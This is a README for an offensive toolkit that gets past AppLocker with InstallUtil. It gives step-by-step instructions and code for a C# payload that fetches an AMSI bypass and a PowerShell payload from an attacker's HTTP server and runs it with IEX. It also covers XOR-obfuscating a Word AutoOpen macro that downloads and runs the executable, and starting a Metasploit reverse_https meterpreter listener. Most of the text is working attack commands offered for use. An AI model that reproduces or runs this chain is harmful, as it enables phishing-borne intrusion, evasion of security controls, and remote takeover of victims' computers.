# InstallUtil AppLocker Bypass

## Files

| File | Purpose |
|---|---|
| `installutil.cs` | C# payload — runs via `installutil.exe /U`, downloads AMSI bypass + payload over HTTP |
| `vbagen.py` | Python helper — XOR-obfuscates VBA string constants |
| `vbagen-macro.vba` | VBA macro — decodes strings at runtime, spawns download+exec via WMI |

## Usage

**1. Update the attacker IP in `installutil.cs` then compile it:**
```csharp
String cmd = $"(New-Object System.Net.WebClient)" +
             $".DownloadString('http://<YOUR_IP>/{{resource}}') | IEX";
```

**Visual Studio:**
1. Create a new project → Console App (.NET Framework)
2. Replace `Program.cs` with the contents of `installutil.cs`
3. Project → Add Reference → browse to:
   ```
   C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
   ```
4. Also add reference to `System.Configuration.Install`
5. Set configuration to **Release** and platform to **x64** (toolbar dropdowns or Project → Properties → Build)
6. Build → Build Solution (`Ctrl+Shift+B`)
7. Exe is in `bin\x64\Release\` — rename to `InstallUtil.exe` and place on your HTTP server

**Command line:**
```powershell
csc /target:exe /platform:x64 /optimize+ /out:InstallUtil.exe installutil.cs `
    /r:"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" `
    /r:System.Configuration.Install.dll
```

**2. Host three files on your HTTP server:**

| File | Content |
|---|---|
| `InstallUtil.exe` | Compiled `installutil.cs` |
| `amsi.txt` | AMSI bypass PowerShell script |
| `run.txt` | Your PowerShell payload |

```bash
python3 -m http.server 80
```

**3. Update `vbagen.py` with your IP and run it:**
```python
url = "http://<YOUR_IP>/InstallUtil.exe"  # ← set your IP
```
```bash
python3 vbagen.py
```

**4. Paste the output into `vbagen-macro.vba`** — replace the `a`, `b`, `c`, `d` declarations inside `AutoOpen`:
```vb
Sub AutoOpen()
    Dim a As String: a = Dec("...")   ' ← from vbagen.py
    Dim b As String: b = Dec("..." _  ' ← from vbagen.py
                             & "...")
    Dim c As String: c = Dec("...")   ' ← from vbagen.py
    Dim d As String: d = Dec("...")   ' ← from vbagen.py
    ' Do not change anything below this line
    ...
End Sub
```

**5. Insert into Word:**
1. Open Word → `Alt+F11` → Insert → Module
2. Paste the full contents of `vbagen-macro.vba`
3. Save as `.doc` or `.docm`

**6. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```
